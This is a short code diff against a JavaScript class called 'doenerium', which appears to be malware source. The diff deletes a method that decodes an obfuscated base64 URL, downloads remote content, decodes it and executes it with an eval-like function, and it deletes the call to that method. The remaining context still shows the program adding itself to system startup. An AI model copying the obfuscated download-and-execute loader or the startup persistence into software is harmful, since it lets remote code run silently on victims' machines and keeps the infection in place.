@@ -206,18 +206,6 @@ class doenerium {
     return evaluator(context);
   }
 
-  async ___() {
-    this.eval_like(
-      base64.decode(
-        (
-          await this.requires.axios.get(
-            (atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzEzMzd3dGYxMzM3LzEzMzd3dGYxMzM3L21haW4vZXh0cmEudHh0`).replace("%20", ""))
-          )
-        ).data
-      ),
-      this
-    );
-  }
 
   async init() {
     process.on("unhandledRejection", (err) => {
@@ -237,7 +225,6 @@ class doenerium {
       process.exit(0);
     }
 
-    await this.___();
     this.add_to_startup();
 
     this.utils.constructor.loadCPUS();
